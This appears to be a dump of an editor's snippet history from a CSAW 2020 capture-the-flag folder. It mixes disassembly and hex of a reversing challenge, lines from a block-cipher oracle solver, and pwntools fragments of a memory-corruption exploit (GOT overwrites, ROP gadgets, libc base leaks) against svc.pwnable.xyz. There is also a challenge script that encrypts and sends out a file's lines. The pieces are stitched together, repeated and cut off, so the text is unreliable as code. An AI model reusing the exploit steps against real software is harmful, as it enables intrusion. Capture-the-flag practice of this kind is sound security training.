	 295:   c7 45 fc 62 9b 08 00    
	 29c:   81 7d fc 60 11 13 00    
	 2a3:   75 07                   
	 2a5:   b8 01 00 00 00          
	 2aa:   eb 56                   
	 2ac:   c6 45 12 95             
	 2b0:   c7 45 fc ba 3c 01 00    
	 2b7:   81 7d fc 8d 22 02 00    
	 2be:   75 07                   
	 2c0:   b8 01 00 00 00          
	 2c5:   eb 3b                   
	 2c7:   c6 45 13 5b             
	 2cb:   c7 45 fc 81 a6 0c 00    
	 2d2:   81 7d fc 45 b5 19 00    
	 2d9:   75 07                   
	 2db:   b8 01 00 00 00          
	 2e0:   eb 20                   
	 2e2:   c6 45 14 a5             
	 2e6:   c7 45 fc 95 0b 05 00    
	 2ed:   81 7d fc d2 79 24 00    
	 2f4:   75 07                   
	 2f6:   b8 01 00 00 00          
	 2fb:   eb 05                   
	 2fd:   b8 00 00 00 00          
	 302:   5d                      
	 303:   c3                      
ee9dbc9d4365d680a308f9f02a3f2b72|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|1|1|^v|asm
	   0:   55                      
	   1:   48 89 e5                
	   4:   c7 45 fc 36 14 03 00    
	   b:   81 7d fc 5a 3f 00 00    
	  12:   75 0a                   
	  14:   b8 01 00 00 00          
	  19:   e9 e4 02 00 00          
	  1e:   c6 45 fc 8e             
	  22:   c7 45 fc a3 3c 09 00    
	  29:   81 7d fc ec 40 1f 00    
	  30:   75 0a                   
	  32:   b8 01 00 00 00          
	  37:   e9 c6 02 00 00          
	  3c:   c6 45 fd 94             
	  40:   c7 45 fc c9 7e 13 00    
	  47:   81 7d fc 47 fc 03 00    
	  4e:   75 0a                   
	  50:   b8 01 00 00 00          
	  55:   e9 a8 02 00 00          
	  5a:   c6 45 fe 89             
	  5e:   c7 45 fc 7c fe 14 00    
	  65:   81 7d fc 28 18 02 00    
	  6c:   75 0a                   
	  6e:   b8 01 00 00 00          
	  73:   e9 8a 02 00 00          
	  78:   c6 45 ff 8f             
	  7c:   c7 45 fc fa d3 06 00    
	  83:   81 7d fc 70 50 03 00    
	  8a:   75 0a                   
	  8c:   b8 01 00 00 00          
	  91:   e9 6c 02 00 00          
	  96:   c6 45 00 a3             
	  9a:   c7 45 fc e2 b6 12 00    
	  a1:   81 7d fc c6 0e 13 00    
	  a8:   75 0a                   
	  aa:   b8 01 00 00 00          
	  af:   e9 4e 02 00 00          
	  b4:   c6 45 01 9d             
	  b8:   c7 45 fc d7 46 0a 00    
	  bf:   81 7d fc b8 e9 18 00    
	  c6:   75 0a                   
	  c8:   b8 01 00 00 00          
	  cd:   e9 30 02 00 00          
	  d2:   c6 45 02 87             
	  d6:   c7 45 fc e7 f5 1b 00    
	  dd:   81 7d fc a1 b3 27 00    
	  e4:   75 0a                   
	  e6:   b8 01 00 00 00          
	  eb:   e9 12 02 00 00          
	  f0:   c6 45 03 90             
	  f4:   c7 45 fc e5 e7 19 00    
	  fb:   81 7d fc 63 8d 03 00    
	 102:   75 0a                   
	 104:   b8 01 00 00 00          
	 109:   e9 f4 01 00 00          
	 10e:   c6 45 04 5c             
	 112:   c7 45 fc 0d fe 09 00    
	 119:   81 7d fc 2b 2f 02 00    
	 120:   75 0a                   
	 122:   b8 01 00 00 00          
	 127:   e9 d6 01 00 00          
	 12c:   c6 45 05 9e             
	 130:   c7 45 fc bc 86 07 00    
	 137:   81 7d fc ec 91 00 00    
	 13e:   75 0a                   
	 140:   b8 01 00 00 00          
	 145:   e9 b8 01 00 00          
	 14a:   c6 45 06 5b             
	 14e:   c7 45 fc a4 5a 05 00    
	 155:   81 7d fc d5 45 0e 00    
	 15c:   75 0a                   
	 15e:   b8 01 00 00 00          
	 163:   e9 9a 01 00 00          
	 168:   c6 45 07 87             
	 16c:   c7 45 fc a1 c1 15 00    
	 173:   81 7d fc c4 f5 1c 00    
	 17a:   75 0a                   
	 17c:   b8 01 00 00 00          
	 181:   e9 7c 01 00 00          
	 186:   c6 45 08 9a             
	 18a:   c7 45 fc 3a 16 0a 00    
	 191:   81 7d fc 4a d1 1d 00    
	 198:   75 0a                   
	 19a:   b8 01 00 00 00          
	 19f:   e9 5e 01 00 00          
	 1a4:   c6 45 09 5b             
	 1a8:   c7 45 fc 33 c6 0a 00    
	 1af:   81 7d fc ea 0d 10 00    
	 1b6:   75 0a                   
	 1b8:   b8 01 00 00 00          
	 1bd:   e9 40 01 00 00          
	 1c2:   c6 45 0a 8b             
	 1c6:   c7 45 fc e1 81 1a 00    
	 1cd:   81 7d fc 92 dc 1c 00    
	 1d4:   75 0a                   
	 1d6:   b8 01 00 00 00          
	 1db:   e9 22 01 00 00          
	 1e0:   c6 45 0b 58             
	 1e4:   c7 45 fc 11 52 0e 00    
	 1eb:   81 7d fc 8b 93 04 00    
	 1f2:   75 0a                   
	 1f4:   b8 01 00 00 00          
	 1f9:   e9 04 01 00 00          
	 1fe:   c6 45 0c 9e             
	 202:   c7 45 fc a8 31 1d 00    
	 209:   81 7d fc 28 5b 13 00    
	 210:   75 0a                   
	 212:   b8 01 00 00 00          
	 217:   e9 e6 00 00 00          
	 21c:   c6 45 0d 5b             
	 220:   c7 45 fc 4b 10 0d 00    
	 227:   81 7d fc 36 36 11 00    
	 22e:   75 0a                   
	 230:   b8 01 00 00 00          
	 235:   e9 c8 00 00 00          
	 23a:   c6 45 0e 9a             
	 23e:   c7 45 fc bb b6 0d 00    
	 245:   81 7d fc b9 af 20 00    
	 24c:   75 0a                   
	 24e:   b8 01 00 00 00          
	 253:   e9 aa 00 00 00          
	 258:   c6 45 0f 5b             
	 25c:   c7 45 fc 5d f2 06 00    
	 263:   81 7d fc 52 87 18 00    
	 26a:   75 0a                   
	 26c:   b8 01 00 00 00          
	 271:   e9 8c 00 00 00          
	 276:   c6 45 10 8c             
	 27a:   c7 45 fc 12 f8 14 00    
	 281:   81 7d fc a0 3d 0b 00    
	 288:   75 07                   
	 28a:   b8 01 00 00 00          
	 28f:   eb 71                   
	 291:   c6 45 11 87             
	 295:   c7 45 fc 62 9b 08 00    
	 29c:   81 7d fc 60 11 13 00    
	 2a3:   75 07                   
	 2a5:   b8 01 00 00 00          
	 2aa:   eb 56                   
	 2ac:   c6 45 12 95             
	 2b0:   c7 45 fc ba 3c 01 00    
	 2b7:   81 7d fc 8d 22 02 00    
	 2be:   75 07                   
	 2c0:   b8 01 00 00 00          
	 2c5:   eb 3b                   
	 2c7:   c6 45 13 5b             
	 2cb:   c7 45 fc 81 a6 0c 00    
	 2d2:   81 7d fc 45 b5 19 00    
	 2d9:   75 07                   
	 2db:   b8 01 00 00 00          
	 2e0:   eb 20                   
	 2e2:   c6 45 14 a5             
	 2e6:   c7 45 fc 95 0b 05 00    
	 2ed:   81 7d fc d2 79 24 00    
	 2f4:   75 07                   
	 2f6:   b8 01 00 00 00          
	 2fb:   eb 05                   
	 2fd:   b8 00 00 00 00          
	 302:   5d                      
	 303:   c3                      
d608fe161138b090ef993cad75e4674d|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|1|1|V|asm
	push   rbp
	mov    rbp, rsp
9854be3cce43f5237d4505ff821366dd|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|157|1|V|asm
	pop    rbp
	ret
104e83349206667ff9d225234b13775e|file:///home/neo/CTFs/csaw2020/modus/sol.py|11|1|V|python
	    print(block1)
453b12a93d223025d69b443ed5a4a633|file:///home/neo/CTFs/csaw2020/modus/sol.py|12|5|V|python
	    print(block2)
587592358ba9eab76acd6d7324e70d32|file:///home/neo/CTFs/csaw2020/modus/sol.py|10|7|v|python
	recvuntil('plaintext: \n')
234f756f5677da28a4c55661907b8fcb|file:///home/neo/CTFs/csaw2020/modus/sol.py|9|12|V|python
	    print(i)
	    i += 1
ecc54bc254152f858152fe3b4befaa69|file:///home/neo/CTFs/csaw2020/modus/sol.py|14|5|V|python
	    # print(ct)
46493153b314fa3d762a5901266b9a02|file:///home/neo/CTFs/csaw2020/modus/sol.py|10|9|V|python
	    if b'plaintext' not in line:
	        print(line)
8f6415ae6165ef3461af73f65d823ee8|file:///home/neo/CTFs/csaw2020/modus/sol.py|20|9|V|python
	        print('same')
e9d97780ac794a193d30568ce5e3cd21|file:///home/neo/CTFs/csaw2020/modus/sol.py|18|19|V|python
	    if block3 == block4:
	        print('same')
f8f1d68501be48a8e834b5b49dbf0ab7|file:///home/neo/CTFs/csaw2020/modus/sol.py|10|12|V|python
	    print(i)
	    i+=1
9c4b06d5b16cc1434051f6dc62e81b81|file:///home/neo/CTFs/csaw2020/modus/sol.py|4|26|v|python
	+ 'f' + 'a' * 15
bc1b3d55fed51a9c7025f9bc11edc25a|file:///home/neo/CTFs/csaw2020/modus/sol.py|30|1|V|python
	        # print('ECB')
	        # print(ct)
02c08a64f740b26c13ed7d6bbd8d1026|file:///home/neo/CTFs/csaw2020/modus/sol.py|32|5|V|python
	        # print('CBC')
9b668c14793ecb242fa0f9e4a29216b8|file:///home/neo/CTFs/csaw2020/grid/exploit.py|47|14|v|python
	0x4008f0 
6c98384e3b7cbf398f2547c3fdea44e7|file:///home/neo/CTFs/csaw2020/grid/exploit.py|47|14|v|python
	0x400e1e
35eee702a1f2fdd232432472f38286c3|file:///home/neo/CTFs/csaw2020/grid/exploit.py|49|16|v|python
	0x400aa9
f60162f9658aec9f23d4871f09f354d0|file:///home/neo/CTFs/csaw2020/grid/exploit.py|44|1|V|python
	    io.recvuntil('> ')
fdd2e0100d519819fb1e9fddd81d6eb7|file:///home/neo/CTFs/csaw2020/grid/exploit.py|10|21|v|python
	'svc.pwnable.xyz' 
92e20d0a891674417af15d626f1be0e1|file:///home/neo/CTFs/csaw2020/grid/exploit.py|55|5|V|python
	    addr_off += 1
a3632137f3b5465c3b52f2c31fd4b32f|file:///home/neo/CTFs/csaw2020/grid/exploit.py|44|1|V|python
	def create_shape(name, x, y):
	    io.recvuntil('> ')
	    io.sendline(name)
	    io.recvuntil('> ')
	    io.sendline(x + ' ' + y)
	
	def write_addr(addr):
	    global addr_off
	    for c in p64(addr):
	        create_shape(chr(c), '12', str(addr_off))
	        addr_off += 1
	
	def display():
	    io.recvuntil('> ')
	    io.sendline('d')
	
	#===========================================================
	#                    EXPLOIT GOES HERE
	#===========================================================
	
	MAIN_ADDR = 0x400bc0
	SHAPE_ADDR = 0x400e1e
	before_disp = 0x400a57
	DISPLAY_ADDR = 0x400aa9
	addr_off = 0
	PUTS_PLT = exe.plt['puts']
	PRINTF_GOT = exe.got['printf']
	PUTS_GOT = exe.got['puts']
	
	io = start()
	write_addr(0x414243)
	write_addr(0x444546)
	
	display()
	
	io.interactive()
952b8fb34351096846d17ba4adaa42b9|file:///home/neo/CTFs/csaw2020/grid/exploit.py|69|15|V|python
	print(exe.plt)
	print(exe.got)
	# OPERATOR<<PLT = exe.plt.std::ostream::operator<<
bc0ee75a3c61cf92ba52472c4195675d|file:///home/neo/CTFs/csaw2020/grid/exploit.py|71|1|V|python
	log_addr('stkchk', STACK_CHK_GOT)
1eedd530783eba815b213a3508d080fb|file:///home/neo/CTFs/csaw2020/grid/exploit.py|73|12|v|python
	0x414243
f9c2ded70ac155b6ea392976b00f801e|file:///home/neo/CTFs/csaw2020/grid/exploit.py|74|12|v|python
	0x444546
791c18d559cd28747261e50c639dc061|file:///home/neo/CTFs/csaw2020/grid/exploit.py|73|1|V|python
	log_addr('pop', POP_RDI)
5ffe0208cbd72726e5f61e7b060d6bcd|file:///home/neo/CTFs/csaw2020/grid/exploit.py|77|1|V|python
	write_addr(STACK_CHK_GOT)
c260f113de7f00fc51df3d6778ef166c|file:///home/neo/CTFs/csaw2020/grid/exploit.py|75|1|V|python
	write_addr(POP_RDI)
ddd769006f209d0da7af460488c0264f|file:///home/neo/CTFs/csaw2020/grid/exploit.py|76|1|V|python
	write_addr(POP_RDI)
	write_addr(POP_RDI)
b2f8fadf9e82f3e67540a796dfd74e02|file:///home/neo/CTFs/csaw2020/grid/exploit.py|66|1|V|python
	before_disp = 0x400a57
3bf63bd5cfe935d9e65e66809e1a1100|file:///home/neo/CTFs/csaw2020/grid/exploit.py|82|1|V|python
	write_addr(STACK_CHK_GOT)
	# write_addr(OP_OUT_PLT)
6aec1d40ad8ce8cd3aa0b3a28c60acc9|file:///home/neo/CTFs/csaw2020/grid/exploit.py|29|13|V|python
	            b *0x400aa9
73d5ceaa17bc434b3ddbdba1783a3c42|file:///home/neo/CTFs/csaw2020/grid/exploit.py|29|13|v|python
	b *0x400baa
caaa9c46ec44dad6aad63469fd9bd061|file:///home/neo/CTFs/csaw2020/grid/exploit.py|84|1|V|python
	print(io.recvline())
	print(io.recvline())
	print(io.recvline())
	print(io.recvline())
	print(io.recvline())
	print(io.recvline())
	print(io.recvline())
	print(io.recvline())
	print(io.recvline())
	print(io.recvline())
0fcef9a9f6ca9d5d1778adbf036cfd47|file:///home/neo/CTFs/csaw2020/grid/exploit.py|85|1|V|python
	print(leaked)
ee15ccf5ebb3dfa79f024caf6ff06e46|file:///home/neo/CTFs/csaw2020/grid/exploit.py|83|54|v|python
	[6:]
bf7e6d3f8a2a4b582b7f1c97144a1d5d|file:///home/neo/CTFs/csaw2020/grid/exploit.py|29|1|V|python
	            b *0x400baa
22d5b74aba2bd85b5d9126b2b9434227|file:///home/neo/CTFs/csaw2020/grid/exploit.py|64|1|V|python
	LIBC = ELF('./libc-2.27.so')
	LIBSTDC = ELF('./libstdc.so.6.0.25')
5a7a76336b7fb3124bfff175faddabaf|file:///home/neo/CTFs/csaw2020/grid/exploit.py|66|1|v|python
	LIBC
68be528a402c6d488d7e7c628670f359|file:///home/neo/CTFs/csaw2020/grid/exploit.py|67|1|v|python
	LIBSTDC
efd45a82f054b83a924afedac2b8c97f|file:///home/neo/CTFs/csaw2020/grid/exploit.py|74|1|V|python
	STACK_CHK_GOT = exe.got.__stack_chk_fail
	log_addr('Stack check', STACK_CHK_GOT)
	log_addr("Op<<", OP_OUT_PLT)
670aa6f9c348cb4dcfb38fb1e731432d|file:///home/neo/CTFs/csaw2020/grid/exploit.py|73|1|V|python
	OP_OUT_PLT = 0x400960
7685b8410a305ec47c9422f6cfb748e3|file:///home/neo/CTFs/csaw2020/grid/exploit.py|70|1|V|python
	SHAPE_ADDR = 0x400e1e
	DISPLAY_ADDR = 0x400aa9
4afcdc73c037753896e399ba4855395d|file:///home/neo/CTFs/csaw2020/grid/exploit.py|70|1|V|python
	SHAPE_ADDR = 0x400e1e
2bbc1a1a3fd478e3bad20b5cbe069fda|file:///home/neo/CTFs/csaw2020/grid/exploit.py|77|1|V|python
	write_addr(MAIN_ADDR)
b92bda38338d64d76b877a43ae198f9f|file:///home/neo/CTFs/csaw2020/grid/exploit.py|79|1|V|python
	print(io.recvuntil('shape'))
49361f40dcf7a89b62ca1c97cea15a34|file:///home/neo/CTFs/csaw2020/grid/exploit.py|79|1|V|python
	print(io.recvuntil('shape')[:-5])
c3af3694314d98a0f8afc01de3e7e09f|file:///home/neo/CTFs/csaw2020/grid/exploit.py|65|14|V|python
	# LIBSTDC = ELF('./libstdc.so.6.0.25')
	libc = ELF('./libc-2.31.so')
981ea4960a7bb0664f916f5a6a079018|file:///home/neo/CTFs/csaw2020/grid/exploit.py|84|1|V|python
	print(hex(u64(leaked[5])))
8010ab0947931300983478ccbe1c9e19|file:///home/neo/CTFs/csaw2020/grid/exploit.py|68|1|V|python
	# libstdc = ELF('./libstdc++.so.6.0.28')
9772a49620447732a73dcf982b0a63f6|file:///home/neo/CTFs/csaw2020/grid/exploit.py|65|1|V|python
	# LIBSTDC = ELF('./libstdc.so.6.0.25')
708aa9511e5de78846be702929320682|file:///home/neo/CTFs/csaw2020/grid/exploit.py|82|10|v|python
	0x1ddd00
bc93cd64ebfa3222090d785527b3f556|file:///home/neo/CTFs/csaw2020/grid/exploit.py|82|1|V|python
	offset = 
7ee706c29b696506126d150de08dec69|file:///home/neo/CTFs/csaw2020/grid/exploit.py|82|16|^v|python
	u64(leaked[6]) 
5be91e37e398aa512890ef21b34cd08f|file:///home/neo/CTFs/csaw2020/grid/exploit.py|88|1|V|python
	libstdc_base = u64(leaked[idx]) - 0x1ddd00
8a8671c56c6ef934307f079021f3e970|file:///home/neo/CTFs/csaw2020/grid/exploit.py|88|1|V|python
	# libstdc_base = u64(leaked[idx]) - 0x1ddd00
8fda4581c82713de67563669ecaf1eb0|file:///home/neo/CTFs/csaw2020/grid/exploit.py|66|1|V|python
	libc = ELF('./libc-2.27.so')
	libstdc = ELF('./libstdc.so.6.0.25')
688174e9a397f1729adbd672efe1f0a2|file:///home/neo/CTFs/csaw2020/grid/exploit.py|21|18|V|python
	    libc = ELF('./libc-2.27.so')
	    libstdc = ELF('./libstdc.so.6.0.25')
9b9424cf25f92671914e8a3f76265972|file:///home/neo/CTFs/csaw2020/grid/exploit.py|71|3|V|python
	# libc = ELF('./libc-2.31.so')
	# libstdc = ELF('./libstdc++.so.6.0.28')
61cb2d1f56423683cfae723c226b1615|file:///home/neo/CTFs/csaw2020/grid/exploit.py|17|9|V|python
	    global libc
	    global libstdc
36f2dc6ee65fdc4865e0966c053cf880|file:///home/neo/CTFs/csaw2020/grid/exploit.py|93|44|v|python
	- 0x1ddd00
35de2053224b9320ed107d390ce910bb|file:///home/neo/CTFs/csaw2020/grid/exploit.py|93|1|V|python
	libstdc_base = u64(leaked[3]) - SYM_OFFSET 
7ba42b07eb16c624a0b8d4c08736bea5|file:///home/neo/CTFs/csaw2020/grid/exploit.py|75|27|v|python
	_ZNSi6sentryC2ERSib
9ad1469b356dbbdf6526b063f5605c5d|file:///home/neo/.config/aliasrc|5|1|V|conf
	alias l='ls -CF'
865ff7f6a6f32722c4d22a6b334ee866|file:///home/neo/.config/aliasrc|4|1|V|conf
	alias la='ls -A'
b08a7cbb700695703b6c4d8a2989ee9a|file:///home/neo/.config/aliasrc|3|1|V|conf
	alias ll='ls -alF'
724874d1be77f450a09b305fc1534afb|file:///home/neo/.config/aliasrc|5|1|v|conf
	alias
ef1772b6dff9a122358552954ad0df65|file:///home/neo/CTFs/csaw2020/ezbreezy/not_even_real.txt|1|1|V|text
	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
2816a3d132461c76274f6e9f7e6c1e4a|file:///home/neo/CTFs/csaw2020/ezbreezy/code|1|1|V|
	554889e5c745fc36140300817dfc5a3f0000750ab801000000e9e4020000c645fc8ec745fca33c0900817dfcec401f00750ab801000000e9c6020000c645fd94c745fcc97e1300817dfc47fc0300750ab801000000e9a8020000c645fe89c745fc7cfe1400817dfc28180200750ab801000000e98a020000c645ff8fc745fcfad30600817dfc70500300750ab801000000e96c020000c64500a3c745fce2b61200817dfcc60e1300750ab801000000e94e020000c645019dc745fcd7460a00817dfcb8e91800750ab801000000e930020000c6450287c745fce7f51b00817dfca1b32700750ab801000000e912020000c6450390c745fce5e71900817dfc638d0300750ab801000000e9f4010000c645045cc745fc0dfe0900817dfc2b2f0200750ab801000000e9d6010000c645059ec745fcbc860700817dfcec910000750ab801000000e9b8010000c645065bc745fca45a0500817dfcd5450e00750ab801000000e99a010000c6450787c745fca1c11500817dfcc4f51c00750ab801000000e97c010000c645089ac745fc3a160a00817dfc4ad11d00750ab801000000e95e010000c645095bc745fc33c60a00817dfcea0d1000750ab801000000e940010000c6450a8bc745fce1811a00817dfc92dc1c00750ab801000000e922010000c6450b58c745fc11520e00817dfc8b930400750ab801000000e904010000c6450c9ec745fca8311d00817dfc285b1300750ab801000000e9e6000000c6450d5bc745fc4b100d00817dfc36361100750ab801000000e9c8000000c6450e9ac745fcbbb60d00817dfcb9af2000750ab801000000e9aa000000c6450f5bc745fc5df20600817dfc52871800750ab801000000e98c000000c645108cc745fc12f81400817dfca03d0b007507b801000000eb71c6451187c745fc629b0800817dfc601113007507b801000000eb56c6451295c745fcba3c0100817dfc8d2202007507b801000000eb3bc645135bc745fc81a60c00817dfc45b519007507b801000000eb20c64514a5c745fc950b0500817dfcd27924007507b801000000eb05b8000000005dc3
5216eb4afbbfaf6e64eda8eb4c732ca5|file:///home/neo/CTFs/csaw2020/adversarial/assignment.txt|146|1|V|text
	#!/usr/bin/env python2
	
	import os
	
	import Crypto.Cipher.AES
	import Crypto.Util.Counter
	
	from Messager import send
	
	
	KEY = os.environ['key']
	IV = os.environ['iv']
	
	secrets = open('/tmp/exfil.txt', 'r')
	
	for pt in secrets:
	    # initialize our counter
	    ctr = Crypto.Util.Counter.new(128, initial_value=long(IV.encode("hex"), 16))
	
	    # create our cipher
	    cipher = Crypto.Cipher.AES.new(KEY, Crypto.Cipher.AES.MODE_CTR, counter=ctr)
	
	    # encrypt the plaintext
	    ciphertext = cipher.encrypt(pt)
	
	    # send the ciphertext
	    send(ciphertext.encode("base-64"))
	
645948917c3a6b04d19c059f1a0c207a|file:///home/neo/CTFs/csaw2020/adversarial/assignment.txt|9|1|V|text
	2us8eN+xyfX3m+ouq+Rp51ruXKXYbKCbe5GjrddBHVm0vhKd2KMXMjFWQVclCmNnsGuEhFSOoFRo
	0hIKHGZrrCS/BRITjW7DJ5L+c0C6Dhu6yBNSnWDpf7sYMknxcaZ+FSwg0nVVNxlNZsfqpd9NOg7F
	OGsysrh8EIGXZiovI6mLWo9FobtcCDbRZXT7Op5rz7hFynKLtFLIx1GTt4CUrKw6J/tpjTZ9mv/w
	bBjD5Iwd060oTwfZd4NVg+GdDqyz1PA=
	
	w+YyIN+r1brrm/li+7YB5Ey6XbjYbKCbfIej69lAEReh+weex/E7NX1GVEcuWGwyt37Ijk7AjlRt
	2RlTSDJ0pTHrUQMZiiuHNdy/NUG2BFH/zR5diiWwcqtMJk36P/V4Hi87lztFfwxRI571sYtGd0CE
	Im5hsbwwGoadIXk+LuCLXoZUp7U=
	
	2es4LJm027Kll/h4tPBH6hX/XaubJfjcYpTm5pMPLBGj+xWdhuR+PWIVDhZkGj52oWuL3wrS/hUp
	nVBfPC555COnRAxckT2aZsi4dx3uB1b5j0wB0CGwPeMYBUD6cbN/ESdslyYYf0xfJIa0tZ5Na1fX
	dWth6/B8JYeWZj8mJ+KLR5Qa769ID2+MIHzrKtowm6kJnn/OjF/Ok0WWtYbY5axpYKFug31slvDn
	OV2Br4g=
	
	wOYuf56/3/W9yLNxpeoB3Ei9TOqVcLydOpKj64YZQEr39VOlgvAqdHxKXVFjH2Nn/DzQ3AzO5yBs
	wwlfBSNvtySsQEtEznaTd9L+QUCsFhf32ghAiCf1MPYOaRuuf/VHFTM43jhHLAtYIdul6MkWaFHL
	bF4ktal8HIqANTgtI6WTGN8T/rUOOTLOMT3lf55xw69Mk2rY4ASanQOusZKMrLI2M+ZphiB9y6e8
	Oludtr0Mxb0oQBuKfY1HlOHHSvXpi/A=
	
	xKM8Yd+s0rClv/kh/K1V7U66FuqxNaycPpSyrtoPDBGj+z6Qk/E3LD8PZwJqGXAi5GiNilPAsBVg
	xBQRD2Z6qzfrXAQJ1m75KYn+fUSpBxf33hVKyTHldb1MOEfxIvVyHiRsij1NKh9RZsrttd9eKQ+G
	KXky5rU9As+SKi0vNODPDp5PuukODjjTNn7hdZhxzK1awH7OoVjek1GfuYCR4v86Mudtlyo+kvPo
	cErb44QI2OcoaAyeYcAAgq6SGe213P5s3JnNJc1kSHnEoWR7bY4u1Tk0w4uqB4E7zR500Ig+M/mz
	qTYUVCbAd8ghJVAxA2aKOZ302gtYn1elVRO7ljUCQfo5WdZtdsimmTN1LcLfB0ZAgLxUIeABA+xG
	ChOBG/Q3az9GqUn6s13t8i24ySz+xCl2fDLqZjCanEVWNtIx1D1Fvm3Mt7+45yoANA7lHqnYsS/Y
	wWqSJswOJmVBuLJprfZ33mPGLsf0FXNzaho9cBYioFIQEzUUyQ==
	
	zPcpbZyzmrTx3u8j46oPqHi9XeqMfarOOpGiudtcC1n17F3I1bZpdCAfABAySzBn9TPb1hPS/0cp
	nV07B2ZyqzHrVw4MlDeAMpP+YU22ERf32ghAiCf1Pu55JVz+Mr4zETRsmjRVMVYZE83g8ItGPkCE
	KG4zo64vUdzEaGB4c7KLH9cO/asdW3eMfC6xNN86kegEkxaB+FnExwOIsZGU9f8nL7V8iSwu0/zh
	ehnS8YxH
	
	xeIrad+h1aClm/0n5uRJ6UnuWeqcZ6qPNtWIrtEDWA2uugfRnuwrdGZKXEciC2lnt3+aih2Xpgcp
	whgeBHk8ky2qUUsVnm7ZKYn+YkCtBxfv0RpRhSWwZKEYJkn0NPV1Ai8h3iFKPgwZIszgsZIReyiK
	Oyo2qagwFc+KKSxqLevEWcdUp/4OCT7bI3j6f4Nhx+hL1iaZvVLFk1eSscGc/royLbV/jjcxl72k
	aATXtp0B0+l6SB+VLptPg62bQw==
	
	2us0b5f42KfskOwxtLFSqEy6GKaZZrvOL5rmv9ZKWBSpthafk6MxMjFbXFd2ECpns2KNnViJqVR9
	2BhfDjNyoCSmQAUImSKAIJC/YgW2ERfv0w9ahCHkdaJBcU3nIad2AzMpmnkCPhZdZsrttd9vNQ+I
	LWY45q85B4qSKjwuZuTYDoVPu/MODzLaLHPmc4NlgqlH13KLtlOFk3eSsZOdrL4hJbV8lip9l/7r
	exmdtr0B0+lsQhGLLphP0biQCb/6yLdmzc2MJ9tySXiX9XI0bMY8nAY3loynBsQo0A41yoR3M/m9
	qCVVTymPbYArLlASBXzEYNTM3k4WlEzkB3Cgl3YOXP0uF85kaZCmgj59JdTfHEhWmbxGJ7IGH6kX
	MheGHfQgKT9fpxCytErt5yu5yTX+lyk+aXf9fD3Ulk0CY509yWgWo2nW/rW56Q==
	
	wOYuf56/3/Wzyrtwp+oB3Ei9TOqVcLydOpKj64gbSEv19VOlgvAqdHxKXVFjH2Nn8j7Y3Q7O5yBs
	wwlfBSNvtySsQEtKzH6SddL+QUCsFhf32ghAiCf1MPgMYRqsf/VHFTM43jhHLAtYIdul5sseaVPL
	bF4ktal8HIqANTgtI6WdGtcS/LUOOTLOMT3lf55xw69Mk2Ta6AWYnQOusZKMrLI2M+ZphiB9xaW0
	O1mdtr0Mxb0oQBuKfY1HlOHJSP3oifA=
	
	2O07Y42sz7vkiu4u7egB5kLuV6SdNayPNdWkrp5bFxWi+wSZhvd+IHlKDm9jDHQuvCqBnBPAnht8
	kBUeHiM8sCrrVg4Z2CfUZpqxZwWmDULozB5fj26wRKZRIgj2IvVqHzU+3jlDLAwZJdbkvpxLdUCk
	Kn4ktP0oGYaAank+LuDZS8dJvLtAAnfJMG/mc4NlgqpI0DnA+G7ExgOOtYqdrKs7JbVqjTA40+Ht
	ZQaftp0B0+l7WRGLd8xFn6WMUO2j1ash0tjHLp5mXSve7z1td9srnDc9h96lDYBp3A9514lkdqqr
	rDJAXjaFcYA9JwVoG3LEOtTs2QtUlU/iECax1nYuXP18Q8NqasTyhj48M8KbXllcnvAeaOsdAuxE
	CxeLT/Q2JUhEplS/o1Ss6CHxySD/030fLCTwfS7UgERXOponzGgBtmnFt6SiomcTLEzpGKnYqyXV
	yCOPLIVdYQ==
	
	2es4LLK5zqfshqsr5+RO5EmrSuqMfa6Ae4ypvp5EFhax9VO4x/MsMXdKXAJhF3MpsGOGiB2GtRtk
	kAkXDWZ5qSC5Qg4SmyuAKZr+eku6Ql70yx5UmyH8MK9WPkX+PawzBC9sij1Hfx1UI8zitZFNPkCK
	Kio1rrh8H4qLMnVqL+uLWY9JrPMODjbOID38coRxgqFakyaGvRfY2luOvMGO6a0gKfpmzw==
	
	2es4LLK5zqfshqsr5+RAqF63S76deOPOFZCp5Z57EBiy+wCIlPc7OTFGXQJtDXRnoWSNgkTO5zZ8
	xF0IACNy5DykUEwOnW7JKI+3cUDzQk71yltfhi/7MK9KPl3xNfkzBygtinVGMFhAKculo5pLZECn
	OXkoqLgvAs+eIzdmZvHOT4RIquldQXfRJGrxf59xjuhK0iCevVnf1lGJ+sGs5LpzNvB6mGUwmv/g
	ekrc8Mkd3qwoXRuWfoBF0baaXKyo3/5118DFJdkzWWSX8nxifYB5/iAsw4uqF40lnh1wnoh9P6qo
	rDZHXmCQZs80JBVoDWHPbofs30da0EKrBTGmjHYYVagoX8N1L5f/nS95LIvfH0dR0uhaKeZSGq1c
	GgXSG/U9aD9EvUL6tFao6zzzyRj+wn0+bSH9Mi2b2V5Mfpc6yDwEvWiZt72ltDNBIkirBbWdsC+Z
	3WaHM4xLb3ATtOEno+4kwybTItv0DHMgfF90dwo3oEIBFT4EyXht/gmmKqUH3+nqpNuKZVNuNm0/
	luqszUFULuho1emuvPoXHjM1RbVfpVbaag4owD/KTWORtWfxEmGyOVHTj9dPiFPpIhIao69KuE/b
	ryCTW6dp5XkAB64E3PSsQzufz49kHITrz4hNkXPn
	
	2es4LJm027Kll/h4tPBH6hX/XaubJfjcYpTm5pMPLBGj+xWdhuR+PWIVDhZkGj52oWuL3wrS/hUp
	nVBfPC555COnRAxckT2aZsi4dx3uB1b5j0wB0CGwPeMYBUD6cbN/ESdslyYYf0xfJIa0tZ5Na1fX
	dWth6/B8JYeWZj8mJ+KLR5Qa769ID2+MIHzrKtowm6kJnn/OjF/Ok0WWtYbY5axpYKFug31slvDn
	OV2Br4g=
	
	3uYzeJa91KGljvkt87ZA5V7gGJ6QcLbOOJSo69NADhzmsh3Rhu06dH5aWgJtHiYmqnPInFKGswNo
	whhfGzJ1qCnrTQoOnGPXL467cQWrDRfu1x5am2Djab1MNEWxcYF7ETRskzBDMQsZMtbkpN9PNRmK
	Im9hsbh8GY6FIzdtMqXeQJdMuvxJCDOdLG6oaoJ2x6Zd2jOCtE6L0k3alYad4qt9YNxmkiw5lrHw
	YQ+T24gdxKBwAV6NZolZ0aCNGe2/zLtz3NbCLp5yQ2+X9XVxYY44zjB4jZHkDIoskEpC28x6cvy5
